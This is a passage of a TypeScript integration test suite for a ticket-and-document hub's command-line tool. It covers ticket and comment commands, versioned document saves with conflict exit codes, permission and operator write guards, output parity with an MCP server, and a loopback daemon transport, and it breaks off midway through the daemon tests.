// A1 — the CLI WRITE layer (hub/src/cli-agentops.ts, D8 CLI-first steps 1–2) + the --json read extension
// (cli-tickets.ts). Drives the REAL `node src/cli.ts <verb> …` (so the ROUTES wiring, the ticket
// create/update re-route, and NEEDS_NODE_SQLITE are exercised too) against an ISOLATED temp hub DB.
// Asserts: the LAYER 0 op dispatcher round-trip (save_issue via `op` → visible via `tickets --json`); each
// sugar verb's happy path; the labels-REPLACE hazard; the relatedTo APPEND-only union; doc save's CAS
// CONFLICT → exit 3 with the {latestVersion,…} payload on stderr; the exit-code contract (2 usage · 1 domain
// · 4 identity/guard · 5 hub unavailable); the operator-in-a-fire cooperative write guard; the D1 --project
// override (dev → FORBIDDEN exit 1; steward → crosses); byte-PARITY sugar ≡ `op` dispatcher ≡ the stdio MCP
// server for list_issues/get_issue (+ field-parity for save_issue, whose updated_at necessarily differs);
// and the daemon transport (settings_json.hub.transport="daemon" → the op POSTs to the loopback daemon).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { spawnSync, spawn } from "node:child_process";
import { rmSync, mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { once } from "node:events";
import { openDb } from "../src/db.ts";
import { ensureSeed, ensureProject, findProject } from "../src/seed.ts";
import { createDaemon } from "../src/daemon.ts";
import { scrubFireEnv } from "./env-scrub.ts"; // LOOP-193: fire markers must never reach a spawned fixture

const ROOT = "/tmp/hub-cli-agentops-test";
rmSync(ROOT, { recursive: true, force: true });
mkdirSync(ROOT, { recursive: true });
const DB = join(ROOT, "hub.db");

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// ── seed: the main project (direct-db), a sibling (the D1 override target), a daemon-transport project ──
{
  const db = openDb(DB);
  ensureSeed(db, "cwt", "CLI Write Test", "CW");
  ensureProject(db, "cwt2", "CW Sibling", "CX");
  const p3 = ensureProject(db, "cwt3", "CW Daemon", "CY");
  db.prepare("UPDATE projects SET settings_json=? WHERE id=?").run(JSON.stringify({ hub: { transport: "daemon" } }), p3);
  // db.ts regression (A1 step 5): every per-command writable connection must carry the 5s busy_timeout.
  const bt = (db.prepare("PRAGMA busy_timeout").get() as { timeout: number }).timeout;
  ok(bt === 5000, `openDb sets PRAGMA busy_timeout=5000 (got ${bt})`);
  db.close();
}

// run the REAL unified CLI (src/cli.ts routes to cli-agentops/cli-tickets) with an isolated env. Fire-marker
// vars are STRIPPED from the base env (the build-artifact leak lesson) so only an explicit override sets them.
function cliEnv(env: Record<string, string | undefined>): NodeJS.ProcessEnv {
  const base: Record<string, string | undefined> = { ...scrubFireEnv(), DEVLOOP_HUB_DB: DB, DEVLOOP_PROJECT: "cwt", DEVLOOP_ACTOR: "pm" };
  delete base.DEVLOOP_TEAM_SCOPE; delete base.DEVLOOP_DEV_SPLIT; delete base.DEVLOOP_HUB_PORT; delete base.DEVLOOP_PROJECTS_JSON;
  return { ...base, ...env } as NodeJS.ProcessEnv;
}
function cli(args: string[], env: Record<string, string | undefined> = {}, stdin?: string): { status: number | null; stdout: string; stderr: string } {
  const r = spawnSync("node", ["src/cli.ts", ...args], { encoding: "utf8", timeout: 60000, env: cliEnv(env), input: stdin ?? "" });
  return { status: r.status, stdout: r.stdout ?? "", stderr: r.stderr ?? "" };
}
// ASYNC variant for the daemon-transport section: the daemon lives IN-PROCESS here, so a blocking spawnSync
// would freeze this process's event loop and the daemon could never answer (a guaranteed 30s timeout).
function cliAsync(args: string[], env: Record<string, string | undefined> = {}): Promise<{ status: number | null; stdout: string; stderr: string }> {
  return new Promise((resolve) => {
    const p = spawn("node", ["src/cli.ts", ...args], { env: cliEnv(env) });
    let out = "", errS = "";
    p.stdout.setEncoding("utf8"); p.stderr.setEncoding("utf8");
    p.stdout.on("data", (c) => (out += c)); p.stderr.on("data", (c) => (errS += c));
    p.on("close", (code) => resolve({ status: code, stdout: out, stderr: errS }));
    p.stdin.end("");
  });
}
const j = (s: string): any => JSON.parse(s);
// the CLI's machine-readable stderr line (node's ExperimentalWarning banners share the stream — take the
// last JSON-looking line, which is what a mechanical caller would parse too).
const stderrJson = (s: string): any => {
  const line = s.trim().split("\n").reverse().find((l) => l.trimStart().startsWith("{"));
  try { return line ? JSON.parse(line) : {}; } catch { return {}; }
};

// ═══ 1. LAYER 0 — the generic op dispatcher ═══════════════════════════════════════════════════════════════
const viaOp = cli(["op", "save_issue", "--args-json", JSON.stringify({ title: "Via op dispatcher", type: "Feature", labels: ["dev-loop", "Feature", "pm"], priority: 2 })]);
ok(viaOp.status === 0, `op save_issue → exit 0 (got ${viaOp.status}; stderr: ${viaOp.stderr.trim()})`);
const opTicket = viaOp.status === 0 ? j(viaOp.stdout) : {};
ok(opTicket.id === "CW-1" && opTicket.created_by === "pm" && opTicket.state === "Todo" && opTicket.priority === 2,
  "op save_issue → the op body as JSON on stdout (CW-1, created_by pm, Todo)");
const roundTrip = cli(["tickets", "--json"]);
ok(roundTrip.status === 0 && j(roundTrip.stdout).some((t: any) => t.id === "CW-1" && t.title === "Via op dispatcher"),
  "round-trip: the op-created ticket is visible via `tickets --json`");
// args on stdin (no --args-json, stdin piped)
const viaStdin = cli(["op", "get_issue"], {}, JSON.stringify({ id: "CW-1" }));
ok(viaStdin.status === 0 && j(viaStdin.stdout).id === "CW-1" && Array.isArray(j(viaStdin.stdout).comments),
  "op get_issue with JSON args on STDIN → the ticket + comments");
const badOp = cli(["op", "nonsense"]);
ok(badOp.status === 2 && /unknown op 'nonsense'/.test(badOp.stderr), `op <unknown> → usage exit 2 listing the ops (status ${badOp.status})`);
const badJson = cli(["op", "list_issues", "--args-json", "{nope"]);
ok(badJson.status === 2 && /not valid JSON/.test(badJson.stderr), `op --args-json '{nope' → usage exit 2 (status ${badJson.status})`);

// ═══ 2. sugar verbs — happy paths ═══════════════════════════════════════════════════════════════════════════
// ticket create (full flag surface)
const created = cli(["ticket", "create", "--title", "Sugar bug", "--type", "Bug", "--labels", "dev-loop,Bug,qa",
  "--priority", "1", "--assignee", "qa", "--description", "Repro: it explodes"]);
ok(created.status === 0, `ticket create → exit 0 (got ${created.status}; stderr: ${created.stderr.trim()})`);
const sugarBug = created.status === 0 ? j(created.stdout) : {};
ok(sugarBug.id === "CW-2" && sugarBug.type === "Bug" && sugarBug.priority === 1 && sugarBug.assignee === "qa"
  && sugarBug.description === "Repro: it explodes" && JSON.stringify(sugarBug.labels) === JSON.stringify(["dev-loop", "Bug", "qa"]),
  "ticket create → all flags land (type/labels/priority/assignee/description)");
// --description-file
const descFile = join(ROOT, "desc.md");
writeFileSync(descFile, "## From a file\nbody line\n");
const fromFile = cli(["ticket", "create", "--title", "File desc", "--type", "Improvement", "--description-file", descFile]);
ok(fromFile.status === 0 && j(fromFile.stdout).description === "## From a file\nbody line\n",
  "ticket create --description-file → the file content is the description verbatim");
// --blocked-by → the §9c 'Blocked-by:' marker comment after the create
const parked = cli(["ticket", "create", "--title", "Parked on externals", "--type", "Improvement", "--blocked-by", "CW-1,CW-2"]);
ok(parked.status === 0, `ticket create --blocked-by → exit 0 (got ${parked.status})`);
const parkedId = parked.status === 0 ? j(parked.stdout).id : "";
const parkedComments = cli(["comments", parkedId]);
ok(parkedComments.status === 0 && j(parkedComments.stdout).some((c: any) => c.body === "Blocked-by: CW-1\nBlocked-by: CW-2" && c.author === "pm"),
  "ticket create --blocked-by → writes the machine-parseable 'Blocked-by: <id>' marker comment (one line per id, §9c)");

// ── LOOP-190: the create path writes BOTH halves of what it was asked to record ────────────────
// `--blocked-by` wrote the §9c LEDGER edge and never set the `blocked` ENFORCEMENT label, so the
// ticket it had just recorded as blocked was fully servable to its dev tier — every serving path
// filters on the label and none reads the marker. Twice on this board, both on staged design
// children, both caught by hand at a gate. The split itself is deliberate and preserved; this is
// the create path writing both halves.
ok(parked.status === 0 && (j(parked.stdout).labels as string[]).includes("blocked"),
  `LOOP-190: --blocked-by ALSO sets the 'blocked' label (got ${JSON.stringify(j(parked.stdout).labels)})`);
const notParked = cli(["ticket", "create", "--title", "No edge", "--type", "Improvement"]);
ok(notParked.status === 0 && !(j(notParked.stdout).labels as string[]).includes("blocked"),
  "LOOP-190: a create WITHOUT --blocked-by is untouched — the label is not added unconditionally");
const parkedWithLabels = cli(["ticket", "create", "--title", "Edge plus labels", "--type", "Improvement", "--labels", "dev-loop,qa", "--blocked-by", "CW-9"]);
const pwl = j(parkedWithLabels.stdout).labels as string[];
ok(parkedWithLabels.status === 0 && pwl.includes("blocked") && pwl.includes("dev-loop") && pwl.includes("qa"),
  `LOOP-190: it ADDS to an explicit --labels set rather than replacing it (got ${JSON.stringify(pwl)})`);

// ── LOOP-287: edge RETIREMENT finally has an emitter ───────────────────────────────────────────
// Creation has been correct by construction since §9c shipped; retirement was 100% hand-typed prose
// through `comment add`, which validates nothing. blocked-by.ts anchors the keyword to the START of
// a line — deliberately, and asserted in its own suite — so a marker written mid-sentence or inside
// **bold** is silently discarded and the edge stays live. 4 of the 6 retirements ever written on
// this board were lost exactly that way.
const retire = cli(["ticket", "update", parkedId, "--unblocked-by", "CW-1,CW-2"]);
ok(retire.status === 0, `LOOP-287: ticket update --unblocked-by → exit 0 (got ${retire.status}) ${retire.stderr.slice(0, 160)}`);
const retireComments = cli(["comments", parkedId]);
const bodies = retireComments.status === 0 ? j(retireComments.stdout).map((c: any) => c.body) : [];
ok(bodies.some((b: string) => b === "Unblocked-by: CW-1\nUnblocked-by: CW-2"),
  `LOOP-287: it writes the marker in the ONE bare-line form the parser reads (got ${JSON.stringify(bodies)})`);
// The form is what matters: every line must START with the keyword, or blocked-by.ts ignores it.
const retiredBody = bodies.find((b: string) => /Unblocked-by/.test(b)) ?? "";
ok(retiredBody.split("\n").every((l: string) => /^Unblocked-by: /.test(l)),
  "LOOP-287: every emitted line is keyword-first — a mid-sentence marker is what the parser discards");
const noRetire = cli(["ticket", "update", parkedId, "--priority", "3"]);
ok(noRetire.status === 0 && j(cli(["comments", parkedId]).stdout).filter((c: any) => /Unblocked-by/.test(c.body)).length === 1,
  "LOOP-287: an update WITHOUT --unblocked-by writes no marker");

// LOOP-11: ticket create --state default (Backlog) and explicit override
const noState = cli(["ticket", "create", "--title", "Default state test", "--type", "Improvement"]);
ok(noState.status === 0 && j(noState.stdout).state === "Backlog",
  "LOOP-11: ticket create with no --state lands Backlog (§5a funnel default)");
const withTodo = cli(["ticket", "create", "--title", "Explicit Todo test", "--type", "Improvement", "--state", "Todo"]);
ok(withTodo.status === 0 && j(withTodo.stdout).state === "Todo",
  "LOOP-11: ticket create --state Todo lands Todo (§3 carve-out)");
const badState = cli(["ticket", "create", "--title", "Bad state test", "--type", "Improvement", "--state", "NotAState"]);
ok(badState.status === 2 && /--state must be one of/.test(badState.stderr),
  `LOOP-11: ticket create --state <invalid> → usage exit 2 (status ${badState.status})`);

// LOOP-11: ticket update --description / --description-file
const descUpdateId = withTodo.status === 0 ? j(withTodo.stdout).id : "";
const descFile2 = join(ROOT, "update-desc.md");
writeFileSync(descFile2, "Updated body\nline 2\n");
const descUpd = cli(["ticket", "update", descUpdateId, "--description-file", descFile2]);
ok(descUpd.status === 0 && j(descUpd.stdout).description === "Updated body\nline 2\n",
  "LOOP-11: ticket update --description-file patches description");
const priorLabels = j(descUpd.stdout).labels; const priorState = j(descUpd.stdout).state;
ok(JSON.stringify(priorLabels) === JSON.stringify([]) && priorState === "Todo",
  "LOOP-11: ticket update --description-file leaves other fields untouched (labels and state unchanged)");
const descAndFile = cli(["ticket", "update", descUpdateId, "--description", "x", "--description-file", descFile2]);
ok(descAndFile.status === 2 && /not both/.test(descAndFile.stderr),
  `LOOP-11: ticket update --description + --description-file → usage exit 2 (status ${descAndFile.status})`);

// ticket update — state transition + the labels-REPLACE hazard + the relatedTo APPEND-only union
const upd = cli(["ticket", "update", "CW-2", "--state", "In Progress"]);
ok(upd.status === 0 && j(upd.stdout).state === "In Progress", "ticket update --state → transitions the ticket");
const replaced = cli(["ticket", "update", "CW-2", "--labels", "qa"]);
ok(replaced.status === 0 && JSON.stringify(j(replaced.stdout).labels) === JSON.stringify(["qa"]),
  "HAZARD proven: --labels REPLACES the full set (dev-loop/Bug dropped; only 'qa' remains)");
const rel1 = cli(["ticket", "update", "CW-2", "--related-to", "+CW-1"]);
ok(rel1.status === 0 && JSON.stringify(j(rel1.stdout).relatedTo) === JSON.stringify(["CW-1"]), "ticket update --related-to +CW-1 → link added");
const rel2 = cli(["ticket", "update", "CW-2", "--related-to", parkedId]);
ok(rel2.status === 0 && JSON.stringify(j(rel2.stdout).relatedTo.slice().sort()) === JSON.stringify(["CW-1", parkedId].sort()),
  "HAZARD proven: --related-to is an APPEND-only union (the earlier CW-1 link survives the second update)");
const dup = cli(["ticket", "update", parkedId, "--state", "Duplicate", "--duplicate-of", "CW-2"]);
ok(dup.status === 0 && j(dup.stdout).duplicateOf === "CW-2" && j(dup.stdout).state === "Duplicate", "ticket update --duplicate-of → the §8 dedupe scalar");
const noop = cli(["ticket", "update", "CW-2"]);
ok(noop.status === 2 && /nothing to update/.test(noop.stderr), `ticket update with no field flags → usage exit 2 (status ${noop.status})`);

// comment add — --body, then stdin '-', then --body-file -
const cmt = cli(["comment", "add", "CW-2", "--body", "from --body"]);
ok(cmt.status === 0 && j(cmt.stdout).author === "pm" && j(cmt.stdout).body === "from --body", "comment add --body → authored as the resolved actor");
const cmtStdin = cli(["comment", "add", "CW-2", "-"], {}, "from stdin\nline 2");
ok(cmtStdin.status === 0 && j(cmtStdin.stdout).body === "from stdin\nline 2", "comment add <id> - → body from stdin");
const cmtBodyFile = cli(["comment", "add", "CW-2", "--body-file", "-"], {}, "from --body-file stdin");
ok(cmtBodyFile.status === 0 && j(cmtBodyFile.stdout).body === "from --body-file stdin", "comment add --body-file - → body from stdin (regression: was ENOENT on literal '-')");
const cmts = cli(["comments", "CW-2"]);
ok(cmts.status === 0 && j(cmts.stdout).length === 3 && j(cmts.stdout)[0].body === "from --body",
  "comments <id> → the chronological comment list as JSON");

// labels / label create / project / events
const labels0 = cli(["labels"]);
ok(labels0.status === 0 && j(labels0.stdout).some((l: any) => l.name === "dev-loop"), "labels → the seeded taxonomy as JSON");
const mkLabel = cli(["label", "create", "cli-test-label", "--kind", "marker"]);
ok(mkLabel.status === 0 && j(mkLabel.stdout).name === "cli-test-label", "label create → the created label as JSON");
ok(j(cli(["labels"]).stdout).some((l: any) => l.name === "cli-test-label"), "labels → includes the just-created label");
const proj = cli(["project"]);
ok(proj.status === 0 && j(proj.stdout).key === "cwt" && j(proj.stdout).ticket_prefix === "CW", "project → the active project as JSON");
const evTicket = cli(["events", "--ticket", "CW-2", "--limit", "50"]);
ok(evTicket.status === 0 && j(evTicket.stdout).length > 0 && j(evTicket.stdout).every((e: any) => e.ticket_id === "CW-2"),
  "events --ticket → only that ticket's attribution rows");
const evLim = cli(["events", "--limit", "3"]);
ok(evLim.status === 0 && j(evLim.stdout).length === 3, "events --limit 3 → capped at 3 rows");
const evSince = cli(["events", "--since", "9999-01-01T00:00:00Z"]);
ok(evSince.status === 0 && j(evSince.stdout).length === 0, "events --since <future> → the server-side ISO filter empties the list");
// --actor: exact handle filter (server-side)
const evActor = cli(["events", "--actor", "pm"]);
ok(evActor.status === 0 && j(evActor.stdout).every((e: any) => e.actor === "pm"), "events --actor pm → only pm's rows");
// composed: --ticket + --actor + --since all applied server-side
const evComposed = cli(["events", "--ticket", "CW-2", "--actor", "pm", "--since", "2000-01-01T00:00:00Z"]);
ok(evComposed.status === 0 && j(evComposed.stdout).every((e: any) => e.ticket_id === "CW-2" && e.actor === "pm"), "events composed (--ticket + --actor + --since) → rows satisfy all filters");
// 400 bad input: non-string actor and unparseable since
const evBadActor = cli(["op", "list_events", "--args-json", '{"actor":42}']);
ok(evBadActor.status === 1 && /actor must be a string/.test(evBadActor.stderr), "events bad actor → 400 with message");
const evBadSince = cli(["op", "list_events", "--args-json", '{"since":"not-a-date"}']);
ok(evBadSince.status === 1 && /since must be a valid ISO 8601 timestamp/.test(evBadSince.stderr), "events bad since → 400 with message");

// ═══ 3. doc family — 1:1 + the CAS CONFLICT → exit 3 contract ══════════════════════════════════════════════
const dSave = cli(["doc", "save", "--slug", "notes", "--kind", "notes", "--base-version", "0"], {}, "hello");
ok(dSave.status === 0 && j(dSave.stdout).version === 1 && j(dSave.stdout).status === "draft", "doc save (stdin body, baseVersion 0) → draft v1");
const dConflict = cli(["doc", "save", "--slug", "notes", "--kind", "notes", "--base-version", "0"], {}, "clobber attempt");
ok(dConflict.status === 3, `doc save with a STALE base-version → exit 3, the CAS CONFLICT contract (got ${dConflict.status})`);
const conflictBody = stderrJson(dConflict.stderr);
ok(conflictBody.latestVersion === 1 && typeof conflictBody.hint === "string" && /^CONFLICT/.test(conflictBody.error ?? ""),
  "doc save CONFLICT → the machine-readable {latestVersion,latestAuthor,hint} payload as JSON on stderr");
const v2File = join(ROOT, "notes-v2.md");
writeFileSync(v2File, "hello v2");
const dSave2 = cli(["doc", "save", "--slug", "notes", "--kind", "notes", "--base-version", "1", "--file", v2File, "--summary", "v2"]);
ok(dSave2.status === 0 && j(dSave2.stdout).version === 2, "doc save --file with the CONFLICT-recovered base-version → v2");
const dGet = cli(["doc", "get", "--slug", "notes", "--version", "latest"]);
ok(dGet.status === 0 && j(dGet.stdout).version === 2 && j(dGet.stdout).body === "hello v2", `doc get --version latest → the newest draft`);
const dHist = cli(["doc", "history", "--slug", "notes"]);
ok(dHist.status === 0 && j(dHist.stdout).length === 2 && j(dHist.stdout)[0].version === 2, "doc history → the version ledger, newest first");
const dDiff = cli(["doc", "diff", "--slug", "notes", "--from", "1", "--to", "2"]);
ok(dDiff.status === 0 && j(dDiff.stdout).unified.includes("- hello") && j(dDiff.stdout).unified.includes("+ hello v2"), "doc diff → the unified line diff");
// codex #5: a selector-less doc diff/publish is a USAGE error (exit 2), never a confusing 404 domain error
const diffNoSel = cli(["doc", "diff", "--from", "1", "--to", "2"]);
ok(diffNoSel.status === 2 && /--slug S or --kind K/.test(diffNoSel.stderr), `doc diff without --slug/--kind → usage exit 2 (status ${diffNoSel.status})`);
const pubNoSel = cli(["doc", "publish", "--version", "1"]);
ok(pubNoSel.status === 2 && /--slug S or --kind K/.test(pubNoSel.stderr), `doc publish without --slug/--kind → usage exit 2 (status ${pubNoSel.status})`);
const pubDenied = cli(["doc", "publish", "--slug", "notes", "--version", "2"]); // actor pm — the operator gate refuses
ok(pubDenied.status === 1 && /FORBIDDEN/.test(pubDenied.stderr), `doc publish as pm → FORBIDDEN, domain exit 1 (got ${pubDenied.status})`);
const pubOk = cli(["doc", "publish", "--slug", "notes", "--version", "2"], { DEVLOOP_ACTOR: "operator" });
ok(pubOk.status === 0 && j(pubOk.stdout).current_version === 2 && j(pubOk.stdout).status === "current",
  "doc publish as operator → published (the single publish gate)");
const dList = cli(["doc", "list"]);
ok(dList.status === 0 && j(dList.stdout).some((d: any) => d.slug === "notes" && d.current_version === 2), "doc list → the registry row shows the published current");
// D6: doc archive — design-only metadata flip (default archives, --restore un-archives); usage guards
cli(["doc", "save", "--slug", "cli-mod", "--kind", "design", "--base-version", "0"], {}, "design body");
const aOk = cli(["doc", "archive", "--slug", "cli-mod"]);
ok(aOk.status === 0 && j(aOk.stdout).archived === true && j(aOk.stdout).kind === "design", "doc archive on a design doc → archived:true");
ok(j(cli(["doc", "list", "--kind", "design"]).stdout).some((d: any) => d.slug === "cli-mod" && d.archived === 1), "doc list carries the archived flag");
const aRestore = cli(["doc", "archive", "--slug", "cli-mod", "--restore"]);
ok(aRestore.status === 0 && j(aRestore.stdout).archived === false, "doc archive --restore → archived:false (reversible)");
const aSingleton = cli(["doc", "archive", "--slug", "notes"]);
ok(aSingleton.status === 1 && /only design docs archive/.test(aSingleton.stderr), `doc archive on a singleton kind → domain exit 1 (got ${aSingleton.status})`);
const aNoSlug = cli(["doc", "archive"]);
ok(aNoSlug.status === 2 && /--slug S/.test(aNoSlug.stderr), "doc archive without --slug → usage exit 2");

// ═══ 4. mirror family (side-effect-free DRYRUN) ════════════════════════════════════════════════════════════
const mStatus = cli(["mirror", "status"]);
ok(mStatus.status === 0 && j(mStatus.stdout).mapped === 0 && j(mStatus.stdout).tickets > 0, "mirror status → coverage counts, no mapping yet");
const mPush = cli(["mirror", "push", "--team-id", "team-x", "--token-env", "DEVLOOP_LINEAR_TOKEN"], { DEVLOOP_MIRROR_DRYRUN: "1" });
ok(mPush.status === 0 && j(mPush.stdout).dryrun === true && Array.isArray(j(mPush.stdout).ops) && j(mPush.stdout).ops.length > 0,
  "mirror push (DRYRUN) → the would-push ops, no network, no mirror_map row");
// D5: `mirror poll` reaches mirror.pollComments; with no pushed docs it is a clean no-op (no Linear read,
// so no live endpoint needed) — the deep poller behavior lives in test/mirror.ts against the mock Linear.
const mPoll = cli(["mirror", "poll", "--token-env", "DEVLOOP_LINEAR_TOKEN"], { DEVLOOP_LINEAR_TOKEN: "lin_x", DEVLOOP_MIRROR_DRYRUN: "1" });
ok(mPoll.status === 0 && j(mPoll.stdout).docs === 0 && j(mPoll.stdout).filed === 0 && j(mPoll.stdout).dryrun === true,
  "mirror poll (DRYRUN, no pushed docs) → clean no-op poll result");
const mPollBad = cli(["mirror", "poll"]);
ok(mPollBad.status === 2 && /--token-env/.test(mPollBad.stderr), "mirror poll without --token-env → usage exit 2");

// ═══ 5. exit-code contract ═════════════════════════════════════════════════════════════════════════════════
const unknownFlag = cli(["ticket", "create", "--bogus", "x"]);
ok(unknownFlag.status === 2 && /unknown flag '--bogus'/.test(unknownFlag.stderr), `unknown flag → usage exit 2 (status ${unknownFlag.status})`);
for (const [verb, argv] of [["labels", ["labels", "garbage"]], ["project", ["project", "garbage"]], ["comments", ["comments", "CW-2", "garbage"]], ["label create", ["label", "create", "x", "garbage"]]] as const) {
  const stray = cli([...argv]);
  ok(stray.status === 2 && /unexpected argument 'garbage'/.test(stray.stderr), `${verb} rejects stray positionals loudly (status ${stray.status})`);
}
const dangling = cli(["comment", "add", "CW-2", "--body"]);
ok(dangling.status === 2 && /--body needs a value/.test(dangling.stderr), `dangling value flag → usage exit 2 (status ${dangling.status})`);
const domain = cli(["op", "get_issue", "--args-json", JSON.stringify({ id: "NOPE-1" })]);
ok(domain.status === 1 && /no such ticket/.test(domain.stderr), `op-level 404 → domain exit 1, the error body on stderr (status ${domain.status})`);
const phantom = cli(["ticket", "create", "--title", "x", "--type", "Bug"], { DEVLOOP_ACTOR: "ghost" });
ok(phantom.status === 4 && /not a known actor/.test(phantom.stderr), `phantom DEVLOOP_ACTOR → identity exit 4 (G1) (status ${phantom.status})`);
const unseeded = cli(["project"], { DEVLOOP_PROJECT: "ghostproj" });
ok(unseeded.status === 4 && /not seeded/.test(unseeded.stderr), `unseeded DEVLOOP_PROJECT → guard exit 4 (G2) (status ${unseeded.status})`);
// D1 --project override: a delivery actor is FORBIDDEN (server-side matrix; the CLI only passes the arg) …
const forbidden = cli(["ticket", "update", "CW-2", "--title", "renamed", "--project", "cwt2"], { DEVLOOP_ACTOR: "dev" });
ok(forbidden.status === 1 && /FORBIDDEN/.test(forbidden.stderr), `--project override as dev → FORBIDDEN, domain exit 1 (status ${forbidden.status})`);
// … while a steward crosses (any existing project key), proving the CLI enforces NOTHING client-side.
const steward = cli(["op", "get_project", "--project", "cwt2"], { DEVLOOP_ACTOR: "sweep" });
ok(steward.status === 0 && j(steward.stdout).key === "cwt2", "op get_project --project cwt2 as sweep → the D1 matrix admits stewards");

// operator-in-a-fire cooperative write guard (DEVLOOP_ACTOR stripped inside a fire env → actor 'operator')
const fireRefused = cli(["comment", "add", "CW-2", "--body", "oops"], { DEVLOOP_ACTOR: undefined, DEVLOOP_DEV_SPLIT: "true" });
ok(fireRefused.status === 4 && /refusing to write as 'operator'/.test(fireRefused.stderr),
  `a write as 'operator' with a fire marker (DEVLOOP_DEV_SPLIT) → guard exit 4 (status ${fireRefused.status})`);
const fireRefused2 = cli(["ticket", "update", "CW-2", "--priority", "3"], { DEVLOOP_ACTOR: "operator", DEVLOOP_TEAM_SCOPE: "1" });
ok(fireRefused2.status === 4, `explicit DEVLOOP_ACTOR=operator + DEVLOOP_TEAM_SCOPE → also refused (status ${fireRefused2.status})`);
const fireOverride = cli(["comment", "add", "CW-2", "--body", "really me", "--i-am-the-operator"], { DEVLOOP_ACTOR: undefined, DEVLOOP_DEV_SPLIT: "true" });
ok(fireOverride.status === 0 && j(fireOverride.stdout).author === "operator", "--i-am-the-operator → the guard yields, write attributed to operator");
const fireRead = cli(["comments", "CW-2"], { DEVLOOP_ACTOR: undefined, DEVLOOP_DEV_SPLIT: "true" });
ok(fireRead.status === 0, "reads are NEVER blocked by the fire guard (comments works as operator inside a fire env)");

// ═══ 6. PARITY — sugar ≡ op dispatcher ≡ stdio MCP (list_issues / get_issue / save_issue) ═════════════════
async function stdioCall(actor: string, name: string, args: Record<string, unknown>): Promise<{ text: string; isError: boolean }> {
  const c = new Client({ name: `cliaop-${actor}`, version: "0.0.0" });
  await c.connect(new StdioClientTransport({
    command: "node", args: ["src/server.ts"],
    env: { ...scrubFireEnv(), DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: "cwt", DEVLOOP_HUB_DB: DB },
  }));
  const r: any = await c.callTool({ name, arguments: args });
  await c.close();
  return { text: r.content?.[0]?.text ?? "", isError: !!r.isError };
}
// sugar ≡ op (byte-equal stdout for the same call)
const parityList1 = cli(["tickets", "--json"]).stdout.trim();
const parityList2 = cli(["op", "list_issues"]).stdout.trim();
ok(parityList1.length > 2 && parityList1 === parityList2, "PARITY: `tickets --json` ≡ `op list_issues` (byte-equal)");
const parityGet1 = cli(["ticket", "CW-2", "--json"]).stdout.trim();
const parityGet2 = cli(["op", "get_issue", "--args-json", JSON.stringify({ id: "CW-2" })]).stdout.trim();
ok(parityGet1.length > 2 && parityGet1 === parityGet2, "PARITY: `ticket <id> --json` ≡ `op get_issue` (byte-equal)");
const parityCmts1 = cli(["comments", "CW-2"]).stdout.trim();
const parityCmts2 = cli(["op", "list_comments", "--args-json", JSON.stringify({ issueId: "CW-2" })]).stdout.trim();
ok(parityCmts1.length > 2 && parityCmts1 === parityCmts2, "PARITY: `comments <id>` ≡ `op list_comments` (byte-equal)");
// filtered list parity (the flag→arg mapping matches the op schema names)
const parityFilt1 = cli(["tickets", "--json", "--type", "Bug", "--fields", "summary", "--limit", "5"]).stdout.trim();
const parityFilt2 = cli(["op", "list_issues", "--args-json", JSON.stringify({ type: "Bug", fields: "summary", limit: 5 })]).stdout.trim();
ok(parityFilt1.length > 2 && parityFilt1 === parityFilt2, "PARITY: filtered `tickets --json` ≡ `op list_issues` with the same args");
// cli ≡ stdio (the three-way extension): reads byte-equal; save_issue field-equal minus updated_at (each
// save stamps its own write time, so byte-equality is impossible for two sequential writes BY DESIGN).
const stdioList = await stdioCall("dev", "list_issues", {});
ok(!stdioList.isError && stdioList.text === parityList2, "PARITY: stdio list_issues text ≡ `op list_issues` stdout (byte-equal)");
const stdioGet = await stdioCall("dev", "get_issue", { id: "CW-2" });
ok(!stdioGet.isError && stdioGet.text === parityGet2, "PARITY: stdio get_issue text ≡ `op get_issue` stdout (byte-equal)");
const saveArgs = { id: "CW-2", title: "Parity rename", priority: 2 };
const cliSave = j(cli(["op", "save_issue", "--args-json", JSON.stringify(saveArgs)], { DEVLOOP_ACTOR: "dev" }).stdout);
const stdioSave = j((await stdioCall("dev", "save_issue", saveArgs)).text);
delete cliSave.updated_at; delete stdioSave.updated_at;
ok(JSON.stringify(cliSave) === JSON.stringify(stdioSave), "PARITY: cli save_issue ≡ stdio save_issue (same body minus the per-write updated_at)");

// codex #6: the op silently ignores an empty assignee — the JSON mode refuses it loudly instead of no-op filtering
const emptyAssignee = cli(["tickets", "--json", "--assignee", ""]);
ok(emptyAssignee.status === 2 && /not expressible in --json mode/.test(emptyAssignee.stderr),
  `tickets --json --assignee '' → usage exit 2, never a silent no-filter (status ${emptyAssignee.status})`);

// ═══ 7. daemon transport — settings_json.hub.transport="daemon" flips the CLI to the loopback op-API ═══════
// (project cwt3 opted in at seed time above)
const noDaemon = cli(["ticket", "create", "--title", "x", "--type", "Bug"], { DEVLOOP_PROJECT: "cwt3" });
ok(noDaemon.status === 5 && /daemon/.test(noDaemon.stderr), `daemon transport with NO daemon reachable → exit 5 hub-unavailable (status ${noDaemon.status})`);
// codex #4: a corrupt runfile port (out of the 0<port<65536 bound) must resolve to "no port" → the same exit 5
{
  const runDir = join(ROOT, "run");
  mkdirSync(runDir, { recursive: true });
  writeFileSync(join(runDir, "daemon-cwt3.json"), JSON.stringify({ port: 70000 }));
  const corruptPort = cli(["project"], { DEVLOOP_PROJECT: "cwt3", DEVLOOP_RUN_DIR: runDir });
  ok(corruptPort.status === 5 && /daemon/.test(corruptPort.stderr), `a corrupt runfile port (70000) → exit 5 hub-unavailable, no sync throw (status ${corruptPort.status})`);
}
{
  const rdb = openDb(DB); rdb.exec("PRAGMA query_only=ON");
  const wdb = openDb(DB);
  const p3 = findProject(rdb, "cwt3")!;
  const server = createDaemon({ db: rdb, projectId: p3, projectKey: "cwt3", writeDb: wdb, actor: "operator" });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const port = String((server.address() as { port: number }).port);
  const viaDaemon = await cliAsync(["ticket", "create", "--title", "Via daemon", "--type", "Bug", "--labels", "dev-loop,Bug,qa"],
    { DEVLOOP_PROJECT: "cwt3", DEVLOOP_ACTOR: "qa", DEVLOOP_HUB_PORT: port });
